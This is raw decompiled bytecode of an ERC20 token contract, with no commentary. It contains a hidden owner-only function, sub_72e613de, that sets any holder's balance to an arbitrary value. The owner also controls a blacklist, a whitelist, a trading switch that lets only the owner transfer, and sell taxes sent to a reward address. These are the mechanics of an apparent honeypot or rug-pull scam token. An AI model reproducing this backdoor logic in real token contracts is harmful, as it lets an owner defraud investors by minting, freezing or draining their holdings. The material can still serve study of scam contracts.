contract main {




// =====================  Runtime code  =====================


address _owner;
array of struct stor1;
array of struct stor2;
uint8 decimals;
uint256 totalSupply;
uint8 stor5; offset 160
uint128 stor5; offset 160
address poolAddress;
address testeAddress;
uint256 sub_dd854652;
uint8 stor9;
uint256 sub_cf9522fd;
address rewardAddress;
mapping of uint8 stor12;
mapping of uint8 stor13;
mapping of uint8 stor14;
mapping of uint256 balances;
mapping of uint256 sellerCountNum;
mapping of uint256 sellerCountToken;
mapping of uint8 stor18;
mapping of uint8 stor19;
uint256 maxSellOutNum;
uint256 maxSellToken;
mapping of uint256 allowed;

function allowAddress(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor12[arg1])
}

function poolAddress() payable {
    return poolAddress
}

function totalSupply() payable {
    return totalSupply
}

function _isBlacklisted(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor14[arg1])
}

function balances(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balances[arg1]
}

function decimals() payable {
    return decimals
}

function allowed(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowed[arg1][arg2]
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balances[address(arg1)]
}

function rewardAddress() payable {
    return rewardAddress
}

function owner() payable {
    return _owner
}

function maxSellToken() payable {
    return maxSellToken
}

function sellerCountNum(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return sellerCountNum[arg1]
}

function teste() payable {
    return testeAddress
}

function _owner() payable {
    return _owner
}

function sub_b3cfb094(?) payable {
    return bool(stor9)
}

function automatedMarketMakerPairs(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor19[arg1])
}

function maxSellOutNum() payable {
    return maxSellOutNum
}

function sub_cf9522fd(?) payable {
    return sub_cf9522fd
}

function sellerCountToken(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return sellerCountToken[arg1]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowed[address(arg1)][address(arg2)]
}

function sub_dd854652(?) payable {
    return sub_dd854652
}

function _isExcludedFromFees(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor13[arg1])
}

function blackLists(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor18[arg1])
}

function _fallback() payable {
    revert
}

function sub_b6981d70(?) payable {
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor9 = uint8(bool(uint8(stor5)))
}

function renounceOwnership() payable {
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(_owner, 0);
    _owner = 0
}

function openTrade() payable {
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(96, 0, stor5) = 1
    stor9 = uint8(bool(uint8(stor5)))
}

function setMaxSellOutNum(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    maxSellOutNum = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    allowed[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function setWhiteAddress(address arg1, bool arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor12[address(arg1)] = uint8(arg2)
}

function setIsTradingEnabled(bool arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(96, 0, stor5) = Mask(96, 0, arg1)
    stor9 = uint8(bool(uint8(stor5)))
}

function excludeFromFees(address arg1, bool arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if stor14[address(arg1)]:
        revert with 0, 'Account is blacklisted'
    stor13[address(arg1)] = uint8(arg2)
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    emit OwnershipTransferred(_owner, arg1);
    _owner = arg1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if not uint8(stor5):
        return 0
    if arg3 > balances[address(arg1)]:
        revert with 'NH{q', 1
    if balances[address(arg1)] < arg3:
        revert with 'NH{q', 17
    balances[address(arg1)] -= arg3
    if balances[address(arg2)] > -arg3 - 1:
        revert with 'NH{q', 17
    if balances[address(arg2)] + arg3 < balances[address(arg2)]:
        revert with 'NH{q', 1
    balances[address(arg2)] += arg3
    if arg3 > allowed[address(arg1)][address(msg.sender)]:
        revert with 'NH{q', 1
    if allowed[address(arg1)][address(msg.sender)] < arg3:
        revert with 'NH{q', 17
    allowed[address(arg1)][address(msg.sender)] -= arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function setMaxSellToken(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not decimals:
        if arg1 and 1 > -1 / arg1:
            revert with 'NH{q', 17
        maxSellToken = arg1
    else:
        if bool(bool(decimals < 78)) or bool(bool(decimals < 32)):
            if 10^decimals > -1:
                revert with 'NH{q', 17
            if arg1 and 10^decimals > -1 / arg1:
                revert with 'NH{q', 17
            maxSellToken = arg1 * 10^decimals
        else:
            s = 10
            t = 1
            idx = decimals
            while idx > 1:
                if s > -1 / s:
                    revert with 'NH{q', 17
                if not bool(idx):
                    s = s * s
                    t = t
                    idx = uint255(idx) * 0.5
                    continue 
                s = s * s
                t = t * s
                idx = uint255(idx) * 0.5
                continue 
            if t > -1 / s:
                revert with 'NH{q', 17
            if arg1 and t * s > -1 / arg1:
                revert with 'NH{q', 17
            maxSellToken = arg1 * t * s
}

function sub_72e613de(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == arg2
    if _owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not decimals:
        if arg2 and 1 > -1 / arg2:
            revert with 'NH{q', 17
        balances[address(arg1)] = arg2
    else:
        if bool(bool(decimals < 78)) or bool(bool(decimals < 32)):
            if 10^decimals > -1:
                revert with 'NH{q', 17
            if arg2 and 10^decimals > -1 / arg2:
                revert with 'NH{q', 17
            balances[address(arg1)] = arg2 * 10^decimals
        else:
            s = 10
            t = 1
            idx = decimals
            while idx > 1:
                if s > -1 / s:
                    revert with 'NH{q', 17
                if not bool(idx):
                    s = s * s
                    t = t
                    idx = uint255(idx) * 0.5
                    continue 
                s = s * s
                t = t * s
                idx = uint255(idx) * 0.5
                continue 
            if t > -1 / s:
                revert with 'NH{q', 17
            if arg2 and t * s > -1 / arg2:
                revert with 'NH{q', 17
            balances[address(arg1)] = arg2 * t * s
}

function name() payable {
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor1.length):
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        else:
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
        if ceil32(stor1.length.field_1) > stor1.length.field_1:
            mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
    if bool(stor1.length) == stor1.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
    if ceil32(stor1.length.field_1) > stor1.length.field_1:
        mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
    return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
}

function symbol() payable {
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor2.length):
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        else:
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
        if ceil32(stor2.length.field_1) > stor2.length.field_1:
            mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
    if bool(stor2.length) == stor2.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
    if ceil32(stor2.length.field_1) > stor2.length.field_1:
        mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
    return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if not uint8(stor5):
        if arg1 != _owner:
            if _owner != msg.sender:
                revert with 0, 'Trading is disabled'
    if balances[address(msg.sender)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
    if stor19[address(arg1)]:
        if stor13[address(msg.sender)]:
            balances[address(msg.sender)] -= arg2
            if balances[address(arg1)] > -arg2 - 1:
                revert with 'NH{q', 17
            balances[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if stor13[address(arg1)]:
                balances[address(msg.sender)] -= arg2
                if balances[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balances[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if not stor19[address(arg1)]:
                    balances[address(msg.sender)] -= arg2
                    if balances[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balances[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor19[address(arg1)]:
                        if not arg2:
                            balances[address(msg.sender)] -= arg2
                            if 0 > arg2:
                                revert with 'NH{q', 1
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balances[stor11] > -1:
                                revert with 'NH{q', 17
                            emit Transfer(0, msg.sender, rewardAddress);
                            if balances[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balances[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2 and sub_cf9522fd > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * sub_cf9522fd / arg2 != sub_cf9522fd:
                                revert with 'NH{q', 1
                            balances[address(msg.sender)] -= arg2
                            if arg2 * sub_cf9522fd / 100 > arg2:
                                revert with 'NH{q', 1
                            if arg2 < arg2 * sub_cf9522fd / 100:
                                revert with 'NH{q', 17
                            if balances[stor11] > -(arg2 * sub_cf9522fd / 100) - 1:
                                revert with 'NH{q', 17
                            balances[stor11] += arg2 * sub_cf9522fd / 100
                            emit Transfer((arg2 * sub_cf9522fd / 100), msg.sender, rewardAddress);
                            if balances[address(arg1)] > -arg2 + (arg2 * sub_cf9522fd / 100) - 1:
                                revert with 'NH{q', 17
                            balances[address(arg1)] = balances[address(arg1)] + arg2 - (arg2 * sub_cf9522fd / 100)
                            emit Transfer((arg2 - (arg2 * sub_cf9522fd / 100)), msg.sender, arg1);
                    else:
                        if not arg2:
                            balances[address(msg.sender)] -= arg2
                            if 0 > arg2:
                                revert with 'NH{q', 1
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balances[stor11] > -1:
                                revert with 'NH{q', 17
                            emit Transfer(0, msg.sender, rewardAddress);
                            if balances[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balances[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2 and sub_dd854652 > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * sub_dd854652 / arg2 != sub_dd854652:
                                revert with 'NH{q', 1
                            balances[address(msg.sender)] -= arg2
                            if arg2 * sub_dd854652 / 100 > arg2:
                                revert with 'NH{q', 1
                            if arg2 < arg2 * sub_dd854652 / 100:
                                revert with 'NH{q', 17
                            if balances[stor11] > -(arg2 * sub_dd854652 / 100) - 1:
                                revert with 'NH{q', 17
                            balances[stor11] += arg2 * sub_dd854652 / 100
                            emit Transfer((arg2 * sub_dd854652 / 100), msg.sender, rewardAddress);
                            if balances[address(arg1)] > -arg2 + (arg2 * sub_dd854652 / 100) - 1:
                                revert with 'NH{q', 17
                            balances[address(arg1)] = balances[address(arg1)] + arg2 - (arg2 * sub_dd854652 / 100)
                            emit Transfer((arg2 - (arg2 * sub_dd854652 / 100)), msg.sender, arg1);
    else:
        if stor13[address(msg.sender)]:
            balances[address(msg.sender)] -= arg2
            if balances[address(arg1)] > -arg2 - 1:
                revert with 'NH{q', 17
            balances[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if stor13[address(arg1)]:
                balances[address(msg.sender)] -= arg2
                if balances[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balances[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if not stor19[address(msg.sender)]:
                    balances[address(msg.sender)] -= arg2
                    if balances[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balances[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor19[address(arg1)]:
                        if not arg2:
                            balances[address(msg.sender)] -= arg2
                            if 0 > arg2:
                                revert with 'NH{q', 1
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balances[stor11] > -1:
                                revert with 'NH{q', 17
                            emit Transfer(0, msg.sender, rewardAddress);
                            if balances[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balances[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2 and sub_cf9522fd > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * sub_cf9522fd / arg2 != sub_cf9522fd:
                                revert with 'NH{q', 1
                            balances[address(msg.sender)] -= arg2
                            if arg2 * sub_cf9522fd / 100 > arg2:
                                revert with 'NH{q', 1
                            if arg2 < arg2 * sub_cf9522fd / 100:
                                revert with 'NH{q', 17
                            if balances[stor11] > -(arg2 * sub_cf9522fd / 100) - 1:
                                revert with 'NH{q', 17
                            balances[stor11] += arg2 * sub_cf9522fd / 100
                            emit Transfer((arg2 * sub_cf9522fd / 100), msg.sender, rewardAddress);
                            if balances[address(arg1)] > -arg2 + (arg2 * sub_cf9522fd / 100) - 1:
                                revert with 'NH{q', 17
                            balances[address(arg1)] = balances[address(arg1)] + arg2 - (arg2 * sub_cf9522fd / 100)
                            emit Transfer((arg2 - (arg2 * sub_cf9522fd / 100)), msg.sender, arg1);
                    else:
                        if not arg2:
                            balances[address(msg.sender)] -= arg2
                            if 0 > arg2:
                                revert with 'NH{q', 1
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balances[stor11] > -1:
                                revert with 'NH{q', 17
                            emit Transfer(0, msg.sender, rewardAddress);
                            if balances[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balances[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2 and sub_dd854652 > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * sub_dd854652 / arg2 != sub_dd854652:
                                revert with 'NH{q', 1
                            balances[address(msg.sender)] -= arg2
                            if arg2 * sub_dd854652 / 100 > arg2:
                                revert with 'NH{q', 1
                            if arg2 < arg2 * sub_dd854652 / 100:
                                revert with 'NH{q', 17
                            if balances[stor11] > -(arg2 * sub_dd854652 / 100) - 1:
                                revert with 'NH{q', 17
                            balances[stor11] += arg2 * sub_dd854652 / 100
                            emit Transfer((arg2 * sub_dd854652 / 100), msg.sender, rewardAddress);
                            if balances[address(arg1)] > -arg2 + (arg2 * sub_dd854652 / 100) - 1:
                                revert with 'NH{q', 17
                            balances[address(arg1)] = balances[address(arg1)] + arg2 - (arg2 * sub_dd854652 / 100)
                            emit Transfer((arg2 - (arg2 * sub_dd854652 / 100)), msg.sender, arg1);
    return 1
}



}
